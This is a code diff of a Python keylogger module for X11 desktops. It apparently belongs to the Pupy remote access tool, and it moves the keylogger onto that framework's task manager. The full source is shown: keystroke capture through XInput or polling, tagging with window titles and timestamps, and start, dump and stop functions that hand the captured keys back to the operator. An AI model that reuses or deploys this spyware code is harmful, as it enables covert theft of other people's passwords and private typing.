@@ -6,6 +6,7 @@ import ctypes as ct
 from ctypes.util import find_library
 import subprocess
 import threading
+import pupy
 
 from subprocess import Popen, PIPE
 import re
@@ -162,8 +163,6 @@ def XiMaxLen():
 
 def XiSetMask(mask, event):
     mask[(event)>>3] |= (1 << ((event) & 7))
-
-KEYLOGGER_THREAD = None
 
 def keysym_to_XK(ks):
     return {
@@ -501,50 +500,40 @@ def keysym_to_unicode(ks):
     }.get(ks)
 
 def keylogger_start():
-    global KEYLOGGER_THREAD
-
-    if KEYLOGGER_THREAD and not KEYLOGGER_THREAD.stopped:
+    if pupy.manager.active(KeyLogger):
         return False
 
     try:
-        keyLogger = KeyLogger()
+        keyLogger = pupy.manager.create(KeyLogger)
     except:
         return 'no_x11'
 
-    keyLogger.start()
-
-    KEYLOGGER_THREAD = keyLogger
     return True
 
 def keylogger_dump():
-    global KEYLOGGER_THREAD
-
-    if KEYLOGGER_THREAD:
-        d = KEYLOGGER_THREAD.dump()
-        return d
+    keylogger = pupy.manager.get(KeyLogger)
+    if keylogger:
+        return keylogger.results
 
 def keylogger_stop():
-    global KEYLOGGER_THREAD
-
-    if KEYLOGGER_THREAD:
-        KEYLOGGER_THREAD.stop()
-        return True
-
-    return False
+    keylogger = pupy.manager.get(KeyLogger)
+    if keylogger:
+        pupy.manager.stop(KeyLogger)
+        return keylogger.results
 
 class NotAvailable(Exception):
     pass
 
-class KeyLogger(threading.Thread):
+class KeyLogger(pupy.Task):
+    results_type = unicode
+
     def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self, *args, **kwargs)
+        super(KeyLogger, self).__init__(*args, **kwargs)
         global x11, xi
 
         self.daemon = False
-        self.stopped = False
         self.last_window = None
         self.last_clipboard = ""
-        self.buffer = []
         self.state = set()
         self.group = 0
         self.level = 0
@@ -567,7 +556,7 @@ class KeyLogger(threading.Thread):
             )
 
         if not self.display:
-            self.stopped = True
+            self.stop()
             raise NotAvailable()
 
     def get_active_window(self):
@@ -598,17 +587,19 @@ class KeyLogger(threading.Thread):
     def get_active_window_title(self):
         return self.get_window_title(self.get_active_window())
 
-    def append_key_buff(self, k):
+    def append(self, k):
         if k:
             window = self.get_active_window_title()
             if self.last_window != window:
                 self.last_window = window
-                self.buffer.append("\n%s: %s \n"%(time(),str(window)))
+                super(KeyLogger, self).append(
+                    '\n{}: {}\n'.format(time(),str(window))
+                )
 
-            self.buffer.append(k)
+            super(KeyLogger, self).append(k)
 
     def poll(self, callback, sleep_interval=.01):
-        while not self.stopped:
+        while self.active:
             sleep(sleep_interval)
             released, group, level = self.fetch_keys_poll()
             callback(self.to_keysyms(released, group, level))
@@ -643,7 +634,7 @@ class KeyLogger(threading.Thread):
         self.x11.XMapWindow(self.display, root_win)
         self.x11.XSync(self.display, 0)
 
-        while not self.stopped:
+        while self.active:
             event = XEvent()
             self.x11.XNextEvent(self.display, ct.pointer(event))
             self.x11.XGetEventData(self.display, ct.pointer(event.cookie))
@@ -659,19 +650,11 @@ class KeyLogger(threading.Thread):
 
         self.x11.XDestroyWindow(self.display, root_win)
 
-    def run(self):
+    def task(self):
         try:
-            self.xinput(self.append_key_buff)
+            self.xinput(self.append)
         except NotAvailable:
-            self.poll(self.append_key_buff)
-
-    def stop(self):
-        self.stopped = True
-
-    def dump(self):
-        res = u''.join(self.buffer)
-        self.buffer = []
-        return res
+            self.poll(self.append)
 
     def fetch_keys_poll(self):
         if not self.display:
@@ -709,6 +692,7 @@ class KeyLogger(threading.Thread):
             raise NotAvailable()
 
         keys = set()
+        level = int(bool(level))
 
         for k in set(released):
             # We incorrectly guess level here, but in 99% real life cases shift means level1
@@ -738,13 +722,3 @@ class KeyLogger(threading.Thread):
         if self.display:
             self.x11.XCloseDisplay(self.display)
             self.display = None
-
-if __name__=="__main__":
-    #the main is only here for testing purpose and won't be run by modules
-    now = time()
-    done = lambda: time() > now + 5
-    keyLogger = KeyLogger()
-    keyLogger.start()
-    sleep(10)
-    print keyLogger.dump()
-    keyLogger.stop()
